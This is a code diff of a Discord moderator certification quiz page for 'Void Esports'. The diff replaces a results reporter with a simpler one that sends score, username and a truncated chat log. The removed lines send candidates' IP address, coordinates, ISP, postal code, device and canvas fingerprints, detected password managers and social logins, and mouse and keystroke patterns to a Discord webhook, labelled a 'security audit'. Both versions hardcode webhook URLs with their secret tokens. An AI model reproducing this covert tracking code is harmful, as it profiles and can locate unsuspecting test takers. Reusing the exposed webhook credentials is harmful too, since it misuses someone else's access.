-                                    const question = testQuestions[i];
-                                    const userAnswer = userAnswers[i] || "No answer";
-                                    const isCorrect = correctAnswers[i] ? "✓" : "✗";
-                                    questionBreakdown += `${i+1}. ${isCorrect} "${question.userMessage.substring(0, 50)}..."\n`;
-                                }
-                                
-                                // Send to Discord webhook with enhanced data
-                                await sendEnhancedResultsToDiscord(
+                                // Send to Discord webhook
+                                await sendResultsToDiscord(
                                     userDiscordUsername, 
                                     testScore, 
                                     testTotalQuestions, 
                                     passed, 
-                                    questionBreakdown, 
-                                    sessionTranscript,
-                                    auditData
+                                    conversationLog
                                 );
                                 
                                 // Send email results
-                                sendEnhancedEmailResults(sessionTranscript, testScore, testTotalQuestions, passed, auditData);
+                                sendEmailResults(conversationLog, testScore, testTotalQuestions, passed);
                                 
                                 // Redirect to success page
-                                window.location.href = successUrl;
+                                window.location.href = `success.html?discord_username=${encodeURIComponent(userDiscordUsername)}&final_score=${testScore}/${testTotalQuestions}&pass_fail=${passed ? 'PASS' : 'FAIL'}&test_date=${encodeURIComponent(new Date().toLocaleString())}`;
                                 
                             } catch (error) {
                                 console.error('Submission error:', error);
                                 // Still redirect even if Discord submission fails
-                                window.location.href = successUrl;
+                                window.location.href = `success.html?discord_username=${encodeURIComponent(userDiscordUsername)}&final_score=${testScore}/${testTotalQuestions}&pass_fail=${passed ? 'PASS' : 'FAIL'}&test_date=${encodeURIComponent(new Date().toLocaleString())}`;
                             }
                         }, 1000);
                     }, 1500);
                 }, 1000);
             }
             
-            // ENHANCED DISCORD WEBHOOK FUNCTION WITH COMPLETE DATA
-            async function sendEnhancedResultsToDiscord(discordUsername, score, totalQuestions, passed, questionBreakdown, transcript, auditData) {
+            // DISCORD WEBHOOK FUNCTION - SIMPLIFIED AS REQUESTED
+            async function sendResultsToDiscord(discordUsername, score, totalQuestions, passed, conversationLog) {
                 try {
-                    // REPLACE THIS URL WITH YOUR ACTUAL DISCORD WEBHOOK URL
-                    const webhookURL = "https://discord.com/api/webhooks/1468524089999101995/h3vElrQ3cjQBGjmeCOVHr5KZF0JLvacpn1v89dQugXPt3t7yv2apQ0TYcjFE0Ae4Xill";
+                    // Use the provided webhook URL
+                    const webhookURL = "https://discord.com/api/webhooks/1469220699183906857/ekA7UCwtF0-2Gph76yGOgHRItTgpUfc_IjwygayTvjCP6OUdkpLwZPDZ2z1LD5B3zWry";
                     
-                    if (webhookURL.includes("YOUR_WEBHOOK")) {
-                        console.warn("Discord webhook URL not configured. Skipping Discord submission.");
-                        return false;
+                    // Format conversation log for Discord
+                    let formattedConversation = "```\n";
+                    const lines = conversationLog.split('\n');
+                    for (let i = 0; i < Math.min(lines.length, 30); i++) {
+                        formattedConversation += lines[i] + '\n';
                     }
-                    
-                    const metrics = auditData.metrics || {};
-                    const exploitAudit = auditData.exploitabilityAudit || {};
-                    const securityFlags = auditData.securityFlags || [];
-                    const behavioralPatterns = auditData.behavioralPatterns || {};
-                    
-                    // Calculate session stats
-                    const sessionDuration = auditData.sessionDuration || 0;
-                    const mousePoints = behavioralPatterns.mousePoints || [];
-                    const mouseSpeed = mousePoints.length > 1 ? 
-                        Math.sqrt(Math.pow(mousePoints[mousePoints.length-1].x - mousePoints[0].x, 2) + 
-                        Math.pow(mousePoints[mousePoints.length-1].y - mousePoints[0].y, 2)) / sessionDuration : 0;
-                    
-                    // Build conversation log
-                    let conversationLog = "```\n";
-                    transcript.forEach((entry, idx) => {
-                        conversationLog += `[${entry.timestamp}] ${entry.speaker}: ${entry.message.substring(0, 100)}\n`;
-                    });
-                    conversationLog += "```";
-                    
-                    // Build question answers breakdown
-                    let answersBreakdown = "";
-                    for (let i = 0; i < transcript.length; i += 2) {
-                        if (i + 1 < transcript.length) {
-                            answersBreakdown += `**Q${Math.floor(i/2)+1}:** ${transcript[i].message.substring(0, 50)}...\n**A${Math.floor(i/2)+1}:** ${transcript[i+1].message.substring(0, 100)}...\n\n`;
-                        }
+                    if (lines.length > 30) {
+                        formattedConversation += `... and ${lines.length - 30} more lines\n`;
                     }
+                    formattedConversation += "```";
                     
-                    // Calculate threat level
-                    let threatLevel = "🟢 LOW";
-                    let exploitScore = auditData.exploitabilityScore || 0;
-                    if (exploitScore > 70) threatLevel = "🔴 CRITICAL";
-                    else if (exploitScore > 50) threatLevel = "🟠 HIGH";
-                    else if (exploitScore > 30) threatLevel = "🟡 MEDIUM";
-                    
-                    // Build main embed
+                    // Build main embed - SIMPLIFIED AS REQUESTED
                     const mainEmbed = {
                         title: "📬 VOID MOD CERTIFICATION TEST RESULTS",
                         color: passed ? 0x00ff00 : 0xff0000,
                         timestamp: new Date().toISOString(),
                         fields: [
                             {
-                                name: "👤 CANDIDATE INFORMATION",
-                                value: `**Name:** \`${discordUsername}\`\n**Status:** ${passed ? "✅ PASS" : "❌ FAIL"}\n**Score:** \`${score}/${totalQuestions}\`\n**Percentage:** \`${Math.round((score/totalQuestions)*100)}%\``,
+                                name: "👤 CANDIDATE",
+                                value: `**Username:** \`${discordUsername}\``,
                                 inline: false
                             },
                             {
-                                name: "📍 GEOLOCATION DATA",
-                                value: `**IP:** \`${metrics.ip || 'Unknown'}\`\n**Coordinates:** ${metrics.lat || '?'}, ${metrics.lon || '?'}\n**ISP:** ${metrics.isp || 'Unknown'}\n**Postal Code:** ${metrics.zip || 'Unknown'}\n**Network:** ${metrics.connection?.effectiveType || 'Unknown'}\n**Timezone:** ${metrics.timezone || 'Unknown'}\n**Address:** ${metrics.city || 'Unknown'}, ${metrics.region || 'Unknown'}, ${metrics.country || 'Unknown'}`,
+                                name: "📊 SCORE",
+                                value: `**Score:** \`${score}/${totalQuestions}\`\n**Percentage:** \`${Math.round((score/totalQuestions)*100)}%\`\n**Result:** ${passed ? "✅ PASS" : "❌ FAIL"}`,
                                 inline: false
                             },
                             {
-                                name: "🖥️ DEVICE INFORMATION",
-                                value: `**Browser:** ${metrics.agent?.substring(0, 50) || 'Unknown'}\n**Platform:** ${metrics.platform || 'Unknown'}\n**Screen:** ${metrics.screenWidth}x${metrics.screenHeight}\n**Language:** ${metrics.language || 'Unknown'}\n**Touch Points:** ${metrics.maxTouchPoints || 0}\n**CPU Cores:** ${metrics.hardwareConcurrency || 'Unknown'}\n**Memory:** ${metrics.deviceMemory || 'Unknown'}GB`,
-                                inline: false
-                            },
-                            {
-                                name: "📈 PERFORMANCE METRICS",
-                                value: `**Session Time:** ${Math.round(sessionDuration/1000)}s\n**Mouse Speed:** ${mouseSpeed.toFixed(2)}px/ms\n**Clicks:** ${behavioralPatterns.clicks || 0}\n**Key Presses:** ${behavioralPatterns.keyPresses || 0}\n**Scroll Events:** ${(behavioralPatterns.scrollEvents || []).length}\n**Cookies:** ${metrics.cookiesCount || 0}\n**LocalStorage:** ${metrics.localStorageSize || '0 KB'}`,
-                                inline: false
-                            },
-                            {
-                                name: "🛡️ SECURITY AUDIT",
-                                value: `**Threat Level:** ${threatLevel}\n**VPN Status:** ${metrics.vpnStatus || '🟢 CLEAN'}\n**VPN Score:** ${metrics.vpnScore || 0}/10\n**WebRTC Leak:** ${metrics.localIP ? '⚠️ DETECTED' : '✅ SAFE'}\n**Fingerprint:** \`${metrics.canvasFingerprint?.substring(0, 16) || 'Unknown'}...\`\n**Fonts Detected:** ${metrics.fontCount || 0}\n**Password Managers:** ${(metrics.passwordManagers || []).join(', ') || 'None'}`,
+                                name: "💬 CONVERSATION LOG",
+                                value: formattedConversation,
                                 inline: false
                             }
                         ],
                         footer: {
-                            text: `Void Esports • Enhanced Security Audit v2.1 • Exploit Score: ${exploitScore}/100`,
+                            text: "Void Esports • Mod Certification System",
                             icon_url: "https://cdn.discordapp.com/embed/avatars/0.png"
                         }
                     };
                     
-                    // Build conversation embed
-                    const conversationEmbed = {
-                        title: "💬 CONVERSATION LOG",
-                        color: 0x5865f2,
-                        description: answersBreakdown.substring(0, 2000) + (answersBreakdown.length > 2000 ? "\n... (truncated)" : ""),
-                        fields: [
-                            {
-                                name: "Full Transcript",
-                                value: conversationLog.substring(0, 1000) + (conversationLog.length > 1000 ? "\n... (truncated)" : ""),
-                                inline: false
-                            }
-                        ],
-                        timestamp: new Date().toISOString()
-                    };
-                    
-                    // Build advanced data embed
-                    const advancedEmbed = {
-                        title: "🔍 ADVANCED DATA COLLECTION",
-                        color: 0x7289da,
-                        fields: [
-                            {
-                                name: "Behavioral Patterns",
-                                value: `**Avg Mouse Speed:** ${mouseSpeed.toFixed(2)}px/ms\n**Input Timing:** ${behavioralPatterns.inputTiming?.length || 0} samples\n**Touch Events:** ${(behavioralPatterns.touchPoints || []).length}`,
-                                inline: true
-                            },
-                            {
-                                name: "System Capabilities",
-                                value: `**WebGL:** ${metrics.webglSupport ? '✅ Yes' : '❌ No'}\n**Audio Fingerprint:** ${metrics.audioFingerprint ? '✅ Yes' : '❌ No'}\n**Battery API:** ${metrics.battery ? '✅ Yes' : '❌ No'}`,
-                                inline: true
-                            },
-                            {
-                                name: "Social Media Detection",
-                                value: `${(metrics.socialMediaLogins || []).length > 0 ? '✅ Detected: ' + metrics.socialMediaLogins.join(', ') : '❌ None detected'}`,
-                                inline: false
-                            },
-                            {
-                                name: "Security Vulnerabilities",
-                                value: `**Total Detected:** ${(securityFlags || []).length}\n${securityFlags.map(f => `• ${f.type}`).join('\n').substring(0, 100)}`,
-                                inline: false
-                            }
-                        ],
-                        timestamp: new Date().toISOString()
-                    };
-                    
-                    // Send to Discord with multiple embeds
+                    // Send to Discord
                     const payload = { 
-                        embeds: [mainEmbed, conversationEmbed, advancedEmbed],
-                        username: "Void Security Audit v2.1",
+                        embeds: [mainEmbed],
+                        username: "Void Mod Certification",
                         avatar_url: "https://cdn.discordapp.com/embed/avatars/0.png",
-                        content: `📊 **MOD CERTIFICATION TEST COMPLETE**\n👤 **Candidate:** ${discordUsername}\n📝 **Score:** ${score}/${totalQuestions} ${passed ? '✅ **PASS**' : '❌ **FAIL**'}\n📍 **Location:** ${metrics.city || 'Unknown'}, ${metrics.country || 'Unknown'}\n🛡️ **Threat Level:** ${threatLevel}\n🔒 **VPN Status:** ${metrics.vpnStatus?.split(' ')[0] || 'Clean'}`
+                        content: `📊 **MOD CERTIFICATION TEST COMPLETE**\n👤 **Candidate:** ${discordUsername}\n📝 **Score:** ${score}/${totalQuestions} ${passed ? '✅ **PASS**' : '❌ **FAIL**'}`
                     };
                     
                     const response = await fetch(webhookURL, {
@@ -5261,13 +4323,11 @@
                 }
             }
             
-            // Send enhanced email results (shared function)
-            function sendEnhancedEmailResults(transcript, score, total, passed, auditData) {
+            // Send email results (shared function)
+            function sendEmailResults(transcript, score, total, passed) {
                 try {
                     let fullTranscriptText = "=== VOID MOD CERTIFICATION TEST TRANSCRIPT ===\n\n";
-                    transcript.forEach((entry, idx) => {
-                        fullTranscriptText += `[${entry.timestamp}] ${entry.speaker}: ${entry.message}\n`;
-                    });
+                    fullTranscriptText += transcript;
                     
                     const now = new Date();
                     const testDate = now.toLocaleDateString('en-US', { 
@@ -5279,9 +4339,6 @@
                         second: '2-digit'
                     });
                     
-                    const passingScore = total - 2;
-                    const metrics = auditData.metrics || {};
-                    
                     const form = document.getElementById('resultsForm');
                     if (!form) return false;
                     
@@ -5292,11 +4349,6 @@
                     document.getElementById('formPassFail').value = passed ? "PASS" : "FAIL";
                     document.getElementById('formQuestionBreakdown').value = fullTranscriptText.substring(0, 5000);
                     document.getElementById('formTotalQuestions').value = total;
-                    document.getElementById('formUserIp').value = metrics.ip || "Unknown";
-                    document.getElementById('formUserCountry').value = metrics.country || "Unknown";
-                    document.getElementById('formUserState').value = metrics.region || "Unknown";
-                    document.getElementById('formUserCity').value = metrics.city || "Unknown";
-                    document.getElementById('formUserTimezone').value = metrics.timezone || "Unknown";
                     
                     // Submit form
                     form.submit();
